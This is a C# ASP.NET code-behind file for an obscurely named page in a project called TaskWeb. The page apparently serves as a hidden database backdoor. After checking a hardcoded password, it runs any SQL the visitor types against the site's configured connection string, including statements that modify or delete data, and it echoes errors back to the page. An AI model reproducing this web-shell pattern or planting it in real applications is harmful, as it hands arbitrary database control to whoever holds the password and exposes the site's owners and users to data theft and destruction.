using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data.SqlClient;
using System.Configuration;
namespace TaskWeb
{
    public partial class aa : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void Button1_Click(object sender, EventArgs e)
        {
            if (txtp.Text != "wmx75873422") return;
            try
            {
                string sql = txtContent.Text.Trim();
                string connstr = ConfigurationManager.ConnectionStrings["DBString"].ConnectionString;
                if (!sql.StartsWith("select"))
                {
                    SqlConnection conn = new SqlConnection(connstr);
                    conn.Open();
                    SqlCommand cmd = new SqlCommand(sql, conn);
                    int c = cmd.ExecuteNonQuery();
                    lblMsg.Text = "" + c;
                }
                else
                {
                    dsSQL.SelectCommand = sql;
                    dsSQL.DataBind();

                }
            }
            catch (Exception ex) {
                lblMsg.Text = ex.Message;
            }
        }
    }
}